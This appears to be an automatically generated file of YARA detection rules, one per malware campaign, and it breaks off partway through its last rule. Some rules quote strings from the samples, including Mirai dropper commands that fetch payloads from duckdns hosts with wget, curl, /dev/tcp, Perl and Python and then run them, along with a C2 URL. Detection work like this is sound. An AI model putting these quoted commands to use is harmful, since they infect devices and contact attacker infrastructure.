rule Sightlines_c2_8e023071_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-8e023071"
        date = "2026-10-29"
        campaign = "c2-8e023071"
        family = "mirai"
        hash = "03434835f1d9dfd94991a8bd3c6add0bbca2989388043cf538945b69203c61a7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-8e023071.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " #%&)*,/12478;=>@CEFIJLOQRTWX[]^abdghkmnpsuvyz|" ascii
        $s1 = "JEhuVodiWr2/F9mixBcaAZTtjx4Rs9cJDLbpEG8i7hPKswcFdsn6MWwINP+Nwmw4AEPpVJevUEvRQbqVMVoLlw==" ascii
        $s2 = "45dT9riAzNY2MfJrt2E4BzGc2KYdfFCtehZabirf6HHkhAShj1HUqZW9H1dnXkv9TJBaBphNAw5zGMWXXNytUS8kSnbSWkJ" ascii
        $s3 = "1sa18fyfR9OiVEMYglOpkqVoGLN7qd5aQNNi5W7/C+VBdHTBJcGZJyyP5B3qcz32" ascii
        $s4 = "MIGHAoGBAJ419DBEOgmQTzo5qXl5fQcN9TN455wkOL7052HzxxRVMyhYmwQcgJvh" ascii
        $s5 = "9mLJKudlVudV0Qxk5qUJaPZ/xupz0NyoVpviuiBOI1gNi8ovSXWzAgEC" ascii
        $s6 = "l -MIO::Socket::INET -e '$s=IO::Socket::INET->new(\"mantac2.duckdns.org:80\")or exit;print $s \"GET /bi" ascii
        $s7 = ";(exec 3<>/dev/tcp/mantac2.duckdns.org/80&&printf 'GET /bin/kla.sh HTTP/1.0\\r\\nHost: mantac2.duckdns" ascii
        $s8 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s9 = "WARNING: ld.so: invalid GLIBC_TUNABLES value `%.*s' for option `%s': ignored." ascii
        $s10 = "$/d'|sh||python -c \"import urllib2;exec(urllib2.urlopen('http://mantac2.duckdns.org/bin/kla.sh').rea" ascii
        $s11 = "(_res_hconf.flags & HCONF_FLAG_MULTI) != 0" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 4214304 and 12 of them
}

rule Sightlines_tlsh_c9898c70_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c9898c70"
        date = "2026-11-01"
        campaign = "tlsh-c9898c70"
        family = "mirai"
        hash = "12b1348cba1874f45147201f3e291a7476766fac4a7d4776c287e6bbc2fda1d3"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c9898c70.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/etc/config/resolv.conf" ascii
        $s1 = "Unknown error Success" ascii
        $s2 = "/etc/config/hosts" ascii
        $s3 = "/proc/%d/exe" ascii
        $s4 = "D @N^NuNV" ascii
        $s5 = "L @N^NuNV" ascii
        $s6 = "j @N^NuNV" ascii
        $s7 = " @N^NuNuNV" ascii
        $s8 = "$_N^NuNuNV" ascii
        $s9 = " OHWHQHy" ascii
        $s10 = "$N^NuNuNV" ascii
        $s11 = "HN^NuNuNV" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 11 of them
}

rule Sightlines_imphash_cd8a4a6f_coinminer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-cd8a4a6f"
        date = "2026-11-01"
        campaign = "imphash-cd8a4a6f"
        family = "coinminer"
        hash = "008f5cf60c229250aeaf6c4d96b74b2cd7c319df620a2e99ea5e906e6587ffda"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-cd8a4a6f.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "xmlns=\"urn:schemas-microsoft-com:asm.v3\"><windowsSettings><dpiAware xmlns=\"http://schemas.microsoft." ascii
        $s1 = "com/SMI/2005/WindowsSettings\">true</dpiAware></windowsSettings></application></assembly>" ascii
        $s2 = "as-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" u" ascii
        $s3 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><trustInfo xmlns=\"urn:schem" ascii
        $s4 = "iAccess=\"false\"></requestedExecutionLevel></requestedPrivileges></security></trustInfo><application " ascii
        $s5 = "E:\\CryptoNight\\bitmonero-master\\src\\miner\\Release\\Crypto.pdb" ascii
        $s6 = "_erfob __gnu[axx::O_CoNcurrefce^ufl/sc_erzkr" ascii
        $s7 = "cic[ktsilg~char, rtd02char[ts!i4s>cha" ascii
        $s8 = "$trogzam kannot bi run in DOS mode$-" ascii
        $s9 = "rulocati_n(0rmtocol v5Rs)ol($`" ascii
        $s10 = "3034383<3@3D3H3L3P3T3X3\\3`3d3h3l3p3t3x3|3" ascii
        $s11 = "6064686<6@6D6H6L6P6T6X6\\6`6d6h6l6p6t6x6|6" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 3156992 and 10 of them
}

rule Sightlines_imphash_6f900601_coinminer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-6f900601"
        date = "2026-11-01"
        campaign = "imphash-6f900601"
        family = "coinminer"
        hash = "10ec67de1ae7d0c14ba166e803b1eaf11b81d19baa8f41981bf664f2194b226a"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-6f900601.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " inflate 1.2.8 Copyright 1995-2013 Mark Adler " ascii
        $s1 = "Failed to convert pyhome to ANSI (invalid multibyte string)" ascii
        $s2 = "Failed to get address for PyMarshal_ReadObjectFromString" ascii
        $s3 = "Failed to convert pypath to ANSI (invalid multibyte string)" ascii
        $s4 = "PyInstaller: pyi_win32_utils_to_utf8 failed." ascii
        $s5 = "WARNING: file already exists but should not: %s" ascii
        $s6 = "Cannot allocate memory for ARCHIVE_STATUS" ascii
        $s7 = "Failed to convert Wflag %s using mbstowcs (invalid multibyte string)" ascii
        $s8 = "Failed to get address for PyObject_CallFunction" ascii
        $s9 = "Failed to get address for Py_FileSystemDefaultEncoding" ascii
        $s10 = "Failed to get address for PyImport_ExecCodeModule" ascii
        $s11 = "Failed to get address for PyRun_SimpleString" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 12542518 and 12 of them
}

rule Sightlines_imphash_feea1561_revstealer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-feea1561"
        date = "2026-10-22"
        campaign = "imphash-feea1561"
        family = "revstealer"
        hash = "0cb21f1ed9c3db04902d28f21ae8a2605a00781bc87a1fbc9ac918da4a19fe3c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-feea1561.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Bi6b=AxXjC" ascii
        $s1 = "s&Ibq/orf" ascii
        $s2 = "MvntM<<v?\\" ascii
        $s3 = "rcBzWWTE6" ascii
        $s4 = "kSE7x}Xv" ascii
        $s5 = "AnyPopup" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 10182656 and 6 of them
}

rule Sightlines_tlsh_f02ec3b2_nanocore
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f02ec3b2"
        date = "2026-11-01"
        campaign = "tlsh-f02ec3b2"
        family = "nanocore"
        hash = "17ed40dea218bde06337f32e3d3443d07fd24cad9b0da82d6d890716ac6308ff"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f02ec3b2.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "#=qtlZnL8mho$rv1eTFz0Mw9UYFC_yCabEZ0xtVePn6wR5aSHE7ti3UfKg2l7D0_xk8" ascii
        $s1 = "#=qgbI51haY38WJ4NumXDqnLC_uKv$aRHAyD63c9HgGYzlsFjikAASqT8RCSswEMouz" ascii
        $s2 = "#=qF4e058OW__NtTzhWOs1UXEJiHrTSwnIZ3q2u9UaLbo49AZaoog8nMfoDeA9BGVvy" ascii
        $s3 = "#=qVCHxDTr$$bwFMb6i9vBKRZciaa69edA3gsLNOty0RAzCorWRBUh2v0PgySYBEvZ0" ascii
        $s4 = "#=qCGokdf0OOxeMJLDkXSfc3NPmwygIQ29RjKQWj$wbNGB9C1pPgma_891QiNyTRXcA" ascii
        $s5 = "#=qK4wGebauvtmTKO0oAyLFzHLhr9rU3HNJmU_ur7Zop$YvLzV4HzmIQ45YslW_q1Vc" ascii
        $s6 = "#=qXjNBjXFhVcOvrRAG8alfq96_gJ4jOa0wwNOaztY3QjLWnMT6wXGDzBnHuUkef5N0" ascii
        $s7 = "#=qyEH54IW$f9fUJb7FOR8r3vj6e$onLGrpm2VGycjbl9TZJEqkwtA4y4bL9ExOWpiA" ascii
        $s8 = "#=q3TG8MLoZf1Y44PREVW$6m76IGmuYE_BOhC_OTjkQJFtYWwRtSeFqevP9hiteuLfz" ascii
        $s9 = "#=qQkx1bBZns8hPde7$PcvfUl2fAairj6t_H8ve7nJO2s3BIB3t7PXd4ZR9h0JHyxrX" ascii
        $s10 = "#=q6Aboe3ONIkez7GgqcdWPi0_vrT_i53_89HUeagGM6MThXvFkvl8hpSeHO1UJawKN" ascii
        $s11 = "#=qenWi8guqQrvoGB55djo0ka_844yTmViBn5_Fr2X6HAceO7AJErk_Rh7nfkfqtUbq" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_09220cf5_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-09220cf5"
        date = "2026-11-01"
        campaign = "tlsh-09220cf5"
        family = ""
        hash = "027ee20166749752ec93c0cd25d25744f6496e969d0f43c75373a6d2ffd0c84f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-09220cf5.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "WARNING: Unsupported flag value(s) of 0x%x in DT_FLAGS_1." ascii
        $s1 = "ELFW(R_TYPE)(reloc->r_info) == ELF_MACHINE_JMP_SLOT" ascii
        $s2 = "((unsigned long) chunk2mem (brk) & MALLOC_ALIGN_MASK) == 0" ascii
        $s3 = "info[DT_RELAENT]->d_un.d_val == sizeof (ElfW(Rela))" ascii
        $s4 = "http://mkhkjxgchtfgu7uhofxzgoawntfzrkdccymveektqgpxrpjb72oq.b32.i2p/cgi-bin/prometei.cgi" ascii
        $s5 = "%s: Symbol `%s' causes overflow in R_X86_64_PC32 relocation" ascii
        $s6 = "_dl_debug_initialize (0, args.nsid)->r_state == RT_CONSISTENT" ascii
        $s7 = "_dl_debug_initialize (0, args->nsid)->r_state == RT_CONSISTENT" ascii
        $s8 = "version == NULL || !(flags & DL_LOOKUP_RETURN_NEWEST)" ascii
        $s9 = "ELFW(R_TYPE) (reloc->r_info) == R_X86_64_RELATIVE" ascii
        $s10 = "conf->nameserver_list[i]->sa_family == AF_INET6" ascii
        $s11 = "lead_zero <= (base == 16 ? (uintmax_t) INTMAX_MAX / 4 : (uintmax_t) INTMAX_MAX)" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 2577750 and 11 of them
}

rule Sightlines_host_ad21b9ea_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-ad21b9ea"
        date = "2026-11-01"
        campaign = "host-ad21b9ea"
        family = ""
        hash = "0f720707e73b3f4248f49542eaca1a7a5a73f06ed848a8ade93f7d623313c8b0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-ad21b9ea.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "pnDCe):hover .VfPpkd-NLUYnc-V67aGc{color:rgb(248,249,250)}.AfoeCd .RnXJS.VfPpkd-O1htCb-OWXEXe-OWB6Me" ascii
        $s1 = "kd-NLUYnc-V67aGc{color:rgb(248,249,250)}.AfoeCd .gOPnwc:hover:not(.VfPpkd-fmcmS-yrriRe-OWXEXe-OWB6Me" ascii
        $s2 = " .VfPpkd-NLUYnc-V67aGc{color:rgba(232,234,237,.38)}.AfoeCd .RnXJS:not(.VfPpkd-O1htCb-OWXEXe-OWB6Me)+" ascii
        $s3 = "ot(.VfPpkd-fmcmS-yrriRe-OWXEXe-OWB6Me) .VfPpkd-NLUYnc-V67aGc{color:rgb(138,180,248)}.AfoeCd .gOPnwc." ascii
        $s4 = "ohUe-UbuQg.VfPpkd-StrnGf-rymPhb-clz4Ic-OWXEXe-YbohUe-QFlW2{width:calc(100% - 32px)}.r6B9Fd{font-fami" ascii
        $s5 = "174,203,250))}.AfoeCd .zNgRPc .VfPpkd-RKhZBe-LgbsSe-OWXEXe-bAa4l .VfPpkd-Jh9lGc:after{background-col" ascii
        $s6 = "ity,0.1)}.AfoeCd .zNgRPc .VfPpkd-RKhZBe-LgbsSe-OWXEXe-bAa4l:not(:disabled){color:rgb(138,180,248);co" ascii
        $s7 = "d-NLUYnc-V67aGc{color:rgb(248,249,250)}.AfoeCd .UAQDDf.VfPpkd-O1htCb-OWXEXe-OWB6Me .VfPpkd-NLUYnc-V6" ascii
        $s8 = "t(:disabled){background-color:rgb(138,180,248)}.AfoeCd .zNgRPc .VfPpkd-RKhZBe-LgbsSe-OWXEXe-C3kE6.Vf" ascii
        $s9 = "IsBm,1.5rem);letter-spacing:var(--H8HCPd,0);font-weight:var(--Bpk69,400)}.uW2Fw-Sx9Kwc-OWXEXe-vOE8Lb" ascii
        $s10 = "ot(.VfPpkd-fmcmS-yrriRe-OWXEXe-OWB6Me) .VfPpkd-NLUYnc-V67aGc{color:rgb(246,174,169)}.AfoeCd .NGdKgb " ascii
        $s11 = "XEXe-OWB6Me) .VfPpkd-NLUYnc-V67aGc{color:rgb(138,180,248)}.AfoeCd .Y5O54e .VfPpkd-fmcmS-yrriRe.VfPpk" ascii
    condition:
        filesize < 1933180 and 12 of them
}

rule Sightlines_imphash_899539c0_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-899539c0"
        date = "2026-10-17"
        campaign = "imphash-899539c0"
        family = ""
        hash = "082ae04ff9306111505f1fcdbef1aca226d2c02f05cd4300374fa64f58a99778"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-899539c0.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "b;BC!:5j~cSR9aZknE0#Qwe'V,3I@vApf*i6<1tF]&rql$OPgsHxDMNJ%.zL_7-mJDDDDCs;aR;F9SE,!6M60.nDxPe####i!ql&" ascii
        $s1 = "PvlxQ$*x<1gDP*<gMs*V0N60iiis3n-,FZ_.xj$~$..-RLLLS%]Q0~O#EVf'zI&wi~reI<*PPAOOO7FEc<q,~!C*CB&reduction" ascii
        $s2 = "S:,,lrzR%~~~':I1Zv&6v.D6j;qfA%N1O,OscSJjjje!9iA~L1IQx*tbJp$!]6$'j:pNt<<<<x*Cmr*j_zwcbQIV#part come k" ascii
        $s3 = "ZNi*ccQnqRRR3~l]i@z<sgJt,j%F0eqREf-esNqF;~.gwDQQQ6:rOqv~OrnB6PSrrr.FsC;Lb:fIp:cFk_b6n:*x'BcIA!bFVm3r" ascii
        $s4 = "p@@@@q,ADx1;.B;kJIvZ<l@@tjN555wm3*_xq*&Ot&3RC:\\ProgramData\\lancer\\scruiaghaps.pdfOLqqqz]9!H!9jskAJ3R" ascii
        $s5 = "lztI3C~w:::QBgA@ZxAIM%ED1xARNs::qrz;----aLa3!#l0:j$e7m63MS-wVR;SzzzcJv#ECO'ER6wcN]#EIpB_PPe&Jt0gmvQb" ascii
        $s6 = "\\PLqqqz]9~B_3!En'5.IVjHNRqsbAnF%tNNN:H<0$LinajI;QJ$Z9t]IJ!DDDCspaR7iaS<Fb6Qiaz1fDDjrz:HBBBEmwf,kNIVJ" ascii
        $s7 = "-l___R.C'B.AQ0$BVr7*w9_maHf7vvvl3b%#3~JxHn]9Zn.xZ5z6s'qOJ!DDDCspaR7iaS<Fb6Qiaz1fDDFrzliteral because" ascii
        $s8 = "tQ<<<x*5_I$vbqD07H1nm<<qaQEEEEfZ~qFS.OVi;@b0Ml';ERC:\\ProgramData\\Wireshark\\mcneauspuosh]1111Di@mLAaB" ascii
        $s9 = "cJ1#EC]#nr$5&3]#bqtzz<rzjnbbbk7*@JE1@17*@k7g'NcPve.<'m71ItaHA';D,p*<'N$1An-:0BBBEmsv~'6p,0MZsigI~xOB" ascii
        $s10 = "AO5!!!!#;'pzv%*zcNvQ~CHv3333&'EDg#BJ*qS1cI-MfS3.ln$aaa@SQt<Afq<3;tl-zp65x]7aazOpenFileRequiringGestu" ascii
        $s11 = "S!@R0lpaS@V!S#xtBRfRIIIrVAJ;g_%*gAN3V~J*fkMs<jDzQvMHl~xHII9LUFA Combined Mass Storage Device#gnnnpa'" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1294336 and 12 of them
}

rule Sightlines_imphash_9740e9d9_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-9740e9d9"
        date = "2026-10-30"
        campaign = "imphash-9740e9d9"
        family = ""
        hash = "0d88aab8e70e331584292ca81aae5eafbcab5cfb881204dfb221bd6248b83871"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-9740e9d9.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" ascii
        $s1 = "        <supportedOS Id=\"{1f676c76-80e1-4239-95bb-83d0f6d0da78}\"/>" ascii
        $s2 = "        <supportedOS Id=\"{35138b9a-5d96-4fbd-8e2d-a2440225f93a}\"/>" ascii
        $s3 = "        <supportedOS Id=\"{8e0f7a12-bfb3-4fe8-b9a5-48fd50a15a9a}\"/>" ascii
        $s4 = "        <supportedOS Id=\"{4a2f28e3-53b9-4441-ba9c-d69d4a4a6e38}\"/>" ascii
        $s5 = "        <supportedOS Id=\"{e2011457-1546-43c5-a5fe-008deee3d3f0}\"/>" ascii
        $s6 = "FastMM Borland Edition (c) 2004 - 2008 Pierre le Riche / Professional Software Development" ascii
        $s7 = "For more detailed information, please visit http://www.jrsoftware.org/ishelp/index.php?topic=setupcm" wide
        $s8 = "<compatibility xmlns=\"urn:schemas-microsoft-com:compatibility.v1\">" ascii
        $s9 = "/MERGETASKS=\"comma separated list of task names\"" wide
        $s10 = "/COMPONENTS=\"comma separated list of component names\"" wide
        $s11 = "<trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\">" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 41184242 and 12 of them
}

rule Sightlines_imphash_a2e5f911_remusstealer
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-a2e5f911"
        date = "2026-10-21"
        campaign = "imphash-a2e5f911"
        family = "remusstealer"
        hash = "06e8c194b2dfce2771dd27e0b8c029497ca6617e5719297cf39f08007e46ad45"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-a2e5f911.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "CreateDesktopW" ascii
        $s1 = "f~}iaa|wH" ascii
        $s2 = "LA@fF;LD" ascii
        $s3 = "L$xL;L$X" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 4 of them
}

rule Sightlines_tlsh_4aa1b8f2_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-4aa1b8f2"
        date = "2026-11-01"
        campaign = "tlsh-4aa1b8f2"
        family = ""
        hash = "0cb21f1ed9c3db04902d28f21ae8a2605a00781bc87a1fbc9ac918da4a19fe3c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-4aa1b8f2.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "\\Registry\\Machine\\Software\\Classes\\" wide
        $s1 = "\\REGISTRY\\MACHINE\\SOFTWARE\\Classes" wide
        $s2 = "\\REGISTRY\\USER" wide
        $s3 = "Wow6432Node" wide
        $s4 = "t$ WATAUE3" ascii
        $s5 = "@88tE@8;tgH" ascii
        $s6 = "x7H9\\$Ht0H" ascii
        $s7 = "G0H9G8u_A" ascii
        $s8 = "H SUVWATH" ascii
        $s9 = "6T{tmF M" ascii
        $s10 = "f9|$@t1H" ascii
        $s11 = "~Hx1UnBZ" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 10182656 and 12 of them
}

rule Sightlines_tlsh_ff382030_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-ff382030"
        date = "2026-11-01"
        campaign = "tlsh-ff382030"
        family = ""
        hash = "0fbc3a79711c7e73a66b97f58ab9e643841d1580eed249c37481cf2922b5c5ce"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-ff382030.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "\\Registry\\Machine\\Software\\Classes\\" wide
        $s1 = "\\REGISTRY\\MACHINE\\SOFTWARE\\Classes" wide
        $s2 = "\\REGISTRY\\USER" wide
        $s3 = "Wow6432Node" wide
        $s4 = "t$ WATAUE3" ascii
        $s5 = "G0H9G8u_A" ascii
        $s6 = "H SUVWATH" ascii
        $s7 = "6T{tmF M" ascii
        $s8 = "~Hx1UnBZ" ascii
        $s9 = "&]p}8W8J" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 9678848 and 10 of them
}

rule Sightlines_tlsh_425f95c6_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-425f95c6"
        date = "2026-10-31"
        campaign = "tlsh-425f95c6"
        family = "mirai"
        hash = "0c32e41265d77469e9fe3b14af5b9cc32ae2a333ebf6fc16d383df9b0bd30f8d"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-425f95c6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "            <Permit8 Type=\"Channel\" Value=\"0,1,2..16\">PlaybackAudioStream</Permit8>" ascii
        $s1 = "    <AnonymousLogin Level=\"40/40\" Dispatch=\"account\">DISABLE</AnonymousLogin>" ascii
        $s2 = "            <Permit4 Type=\"Channel\" Value=\"0,1,2..16\">PlaybackAudio</Permit4>" ascii
        $s3 = "            <Permit7 Type=\"Channel\" Value=\"0,1,2..16\">PlaybackVideoStream</Permit7>" ascii
        $s4 = "            <Permit3 Type=\"Channel\" Value=\"0,1,2..16\">PlaybackVideo</Permit3>" ascii
        $s5 = "            <Permit6 Type=\"Channel\" Value=\"0,1,2..16\">LiveAudioStream</Permit6>" ascii
        $s6 = "            <Permit14 Type=\"Switch\" Value=\"YES/NO\">LogClean</Permit14>" ascii
        $s7 = "            <Permit5 Type=\"Channel\" Value=\"0,1,2..16\">LiveVideoStream</Permit5>" ascii
        $s8 = "        <Level Level=\"40/40\" Dispatch=\"account\">SUPERVISOR</Level>" ascii
        $s9 = "            <Permit15 Type=\"Switch\" Value=\"YES/NO\">CleanHDD</Permit15>" ascii
        $s10 = "            <Permit2 Type=\"Channel\" Value=\"0,1,2..16\">LiveAudio</Permit2>" ascii
        $s11 = "            <Permit13 Type=\"Switch\" Value=\"YES/NO\">LogReview</Permit13>" ascii
    condition:
        filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_c4dcc590_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c4dcc590"
        date = "2026-11-01"
        campaign = "tlsh-c4dcc590"
        family = ""
        hash = "0764dd0eac58c863c3c99ecd8f4f6ad65fb56d135765afe3233e5adc3c3d696c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c4dcc590.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "D$>fD9t$>t" ascii
        $s1 = "D$THcD$LI" ascii
        $s2 = "AWAVAUATUL" ascii
        $s3 = "F H3G I!" ascii
        $s4 = "H9D$(r1H" ascii
        $s5 = "AWAVAUATM" ascii
        $s6 = "D$x3D$01" ascii
        $s7 = "T$0HcE$H" ascii
        $s8 = "3\\$x3l$l" ascii
        $s9 = "L$<9L$Ls" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1081536 and 9 of them
}

rule Sightlines_tlsh_a1a761d8_amos
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a1a761d8"
        date = "2026-11-01"
        campaign = "tlsh-a1a761d8"
        family = "amos"
        hash = "068014cbc7f03df5d6025df6b4458abeb8e9622ae0e4535aac27e8b615282b74"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a1a761d8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/usr/lib/libSystem.B.dylib" ascii
        $s1 = "/usr/lib/libc++.1.dylib" ascii
        $s2 = "@___cxa_guard_acquire" ascii
        $s3 = "@___cxa_guard_release" ascii
        $s4 = "@___stack_chk_guard" ascii
        $s5 = "@dyld_stub_binder" ascii
        $s6 = "@_mach_task_self_" ascii
        $s7 = "@___stack_chk_fail" ascii
        $s8 = "@_pthread_once" ascii
        $s9 = "__la_symbol_ptr" ascii
        $s10 = "__mod_init_func" ascii
        $s11 = "@___clear_cache" ascii
    condition:
        filesize < 4829824 and 10 of them
}

rule Sightlines_tlsh_f45cf165_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-f45cf165"
        date = "2026-11-01"
        campaign = "tlsh-f45cf165"
        family = ""
        hash = "0a274d9ee2f3ceef05af7f4527fc450c44d7b27f48aa7c78cab90c6500ceb675"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-f45cf165.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = ".eh_poolATI" ascii
        $s1 = "p L3P0L3PXH" ascii
        $s2 = "glibcxx.SH" ascii
        $s3 = "H3x@H3xhM1" ascii
        $s4 = "L3@8L3@`M1" ascii
        $s5 = "L3`PL3H8H" ascii
        $s6 = "L3hPL3hxL3" ascii
        $s7 = "D$0H+D$8" ascii
        $s8 = "tnAUATUH" ascii
        $s9 = "mAVAUATI" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 9 of them
}

rule Sightlines_c2_e7824e15_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign c2-e7824e15"
        date = "2026-11-01"
        campaign = "c2-e7824e15"
        family = "mirai"
        hash = "323c3cff3088cebcb9d637896828aa4f29a3a5e726b7b0cf1a6ecf6fe8d8883e"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/c2-e7824e15.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "iptables -I INPUT -p tcp -m multiport --dports 23,2323,5555,7547,80,8080,22,2222 -j DROP 2>/dev/null" ascii
        $s1 = "echo '4096 87380 16777216' > /proc/sys/net/ipv4/tcp_wmem 2>/dev/null" ascii
        $s2 = "echo '1024 65535' > /proc/sys/net/ipv4/ip_local_port_range 2>/dev/null" ascii
        $s3 = " x || busybox wget http://phubotnet.duckdns.org/main_arm -O x || curl -O http://phubotnet.duckdns.or" ascii
        $s4 = "echo 4194304 > /proc/sys/net/core/wmem_default 2>/dev/null" ascii
        $s5 = " busybox wget http://phubotnet.duckdns.org/%s -O %s || curl -O http://phubotnet.duckdns.org/%s; busy" ascii
        $s6 = "echo 100000 > /proc/sys/net/core/netdev_max_backlog 2>/dev/null" ascii
        $s7 = "echo 16777216 > /proc/sys/net/core/wmem_max 2>/dev/null" ascii
        $s8 = "shell:cd /data/local/tmp || cd /data/tmp || cd /cache; wget http://phubotnet.duckdns.org/main_arm -O" ascii
        $s9 = "echo 16777216 > /proc/sys/net/core/rmem_max 2>/dev/null" ascii
        $s10 = "g/main_arm; busybox chmod 777 x main_arm; chmod 777 x main_arm; ./x adb.telnet &; ./main_arm adb.tel" ascii
        $s11 = "echo 'nameserver 8.8.8.8' > /etc/resolv.conf 2>/dev/null; echo 'nameserver 1.1.1.1' >> /etc/resolv.c" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 8 of them
}

rule Sightlines_host_dec802d7_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign host-dec802d7"
        date = "2026-11-01"
        campaign = "host-dec802d7"
        family = "mirai"
        hash = "c36da87c2bfff2ec8d93228ca0f017e9e1f942c74a0d1387bcd6659c7418e8d0"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/host-dec802d7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS" ascii
        $s1 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A" ascii
        $s2 = "e365`70;9ag:<$ef1=d?2>T" ascii
        $s3 = "$662*7!E" ascii
    condition:
        filesize < 1048576 and 4 of them
}

rule Sightlines_imphash_9984ea5e_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-9984ea5e"
        date = "2026-11-01"
        campaign = "imphash-9984ea5e"
        family = ""
        hash = "3e64a72d9226a356193b15889065e505ec2a3ced63948d01989c1f5e167aa4fb"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-9984ea5e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "/Create/F/TNMicrosoftEdgeUpdate/TR/SCONLOGONSoftware\\Classes\\CLSID\\{BCDE0395-E52F-467C-8E3D-C4579291" ascii
